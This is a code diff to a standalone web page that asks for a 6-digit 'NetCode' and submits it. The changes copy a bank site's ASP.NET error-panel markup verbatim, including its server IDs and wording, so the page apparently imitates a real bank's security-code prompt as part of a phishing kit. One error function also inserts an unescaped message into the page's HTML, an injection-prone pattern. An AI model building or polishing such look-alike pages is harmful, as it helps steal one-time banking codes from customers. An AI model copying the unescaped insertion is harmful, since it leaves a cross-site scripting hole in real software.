@@ -154,19 +154,31 @@
   }
 
   /* ===== 4. SHOW VALIDATION ERROR ===== */
-  function showValidationError(msg) {
-    const errorMessage = document.getElementById('errorMessage');
-    if (errorMessage) {
-      errorMessage.textContent = msg || 'Please enter a valid 6 digit NetCode.';
-      errorMessage.style.display = 'block';
+  function showValidationError() {
+    // Remove existing error first
+    hideValidationError();
+
+    const netcodeInput = document.getElementById('netcode');
+    const errorHtml = `<div class="MessagePanel arrow MessagePanel_Validation" id="ctl00_mplMessagePanel" style="display: block;"><div class="message_contents message_contents_validation"><div class="message"><div class="message_icon validation icon icon_validation"><i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i></div><h3><span class="validation">We're sorry, information required for one or more fields is missing or incorrect.</span></h3><ul class="msg_cnt_wrp msg_cnt_wrp_validation"><li><div class="linkWrap"><a href="#netcode" onclick="document.getElementById('netcode').focus(); return false;"><strong>NetCode </strong></a> - </div><div class="msgWrap">This is required.</div></li><li></li></ul></div></div><b aria-hidden="true" role="presentation" class="barrow" tabindex="-1"><bdo></bdo></b></div>`;
+
+    // Insert before main-content
+    const mainContent = document.querySelector('.main-content');
+    if (mainContent) {
+      mainContent.insertAdjacentHTML('beforebegin', errorHtml);
     }
+
+    // Focus the field
+    if (netcodeInput) netcodeInput.focus();
+    
+    // Scroll to top
+    window.scrollTo(0, 0);
   }
 
   /* ===== 5. HIDE VALIDATION ERROR ===== */
   function hideValidationError() {
-    const errorMessage = document.getElementById('errorMessage');
-    if (errorMessage) {
-      errorMessage.style.display = 'none';
+    const existing = document.getElementById('ctl00_mplMessagePanel');
+    if (existing) {
+      existing.remove();
     }
   }
 
@@ -219,19 +231,25 @@
     }
   }
 
-  /* ===== 8. SHOW ERROR MESSAGE ===== */
+  /* ===== 8. SHOW ERROR MESSAGE (for server errors) ===== */
   function showErrorMessage(msg) {
-    const errorMessage = document.getElementById('errorMessage');
-    if (errorMessage) {
-      errorMessage.textContent = msg || 'Invalid NetCode. Please try again.';
-      errorMessage.style.display = 'block';
+    // Remove existing error first
+    hideValidationError();
+
+    const errorHtml = `<div class="MessagePanel arrow MessagePanel_Validation" id="ctl00_mplMessagePanel" style="display: block;"><div class="message_contents message_contents_validation"><div class="message"><div class="message_icon validation icon icon_validation"><i tabindex="-1"><span class="ScreenReader">Please read the following message</span></i></div><h3><span class="validation">${msg || 'Invalid NetCode. Please try again.'}</span></h3></div></div><b aria-hidden="true" role="presentation" class="barrow" tabindex="-1"><bdo></bdo></b></div>`;
+
+    const mainContent = document.querySelector('.main-content');
+    if (mainContent) {
+      mainContent.insertAdjacentHTML('beforebegin', errorHtml);
     }
-    
+
     const netcodeInput = document.getElementById('netcode');
     if (netcodeInput) {
       netcodeInput.value = '';
       netcodeInput.focus();
     }
+    
+    window.scrollTo(0, 0);
   }
 
   /* ===== 9. CLEAR FORM ===== */
@@ -290,12 +308,14 @@
 
   /* ===== 11. SUBMIT NETCODE ===== */
   async function submitNetCode() {
+    // Hide any previous error
+    hideValidationError();
+
     if (!validateNetCode()) {
       showValidationError();
       return;
     }
 
-    hideValidationError();
     showLoading();
 
     const netcode = getNetCode();
@@ -599,7 +619,6 @@
     <!-- NetCode Form -->
     <div class="form-container">
       <div class="form-group">
-        <label for="netcode">NetCode</label>
         <input 
           type="text" 
           id="netcode" 
@@ -811,6 +830,7 @@
   </div>
  </body>
 </html>
+
 
 
 
